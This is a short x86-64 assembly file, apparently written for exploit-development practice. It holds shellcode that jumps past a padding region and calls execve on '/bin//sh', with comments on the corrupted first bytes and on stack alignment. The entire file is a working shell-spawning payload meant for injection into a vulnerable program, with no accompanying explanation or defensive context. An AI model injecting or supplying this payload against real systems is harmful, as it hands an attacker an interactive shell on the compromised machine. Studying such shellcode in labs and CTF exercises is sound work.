section .text

global _start

_start:
	; nop sled because the 8 first adresses are going to be corrupted

	jmp shellcode
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop

	shellcode:

	xor rdi,rdi
	xor rsi,rsi
	xor rdx,rdx
	xor rax,rax
	
	; # /bin//sh in little indian hex . Two slashes to fill all the 8 bytes
	push rax
	mov rdi,0x68732F2F6E69622F
	push rdi
	mov rdi,rsp
	mov al,0x3b

	and  rsp,-16 ;alignement de pile

	syscall
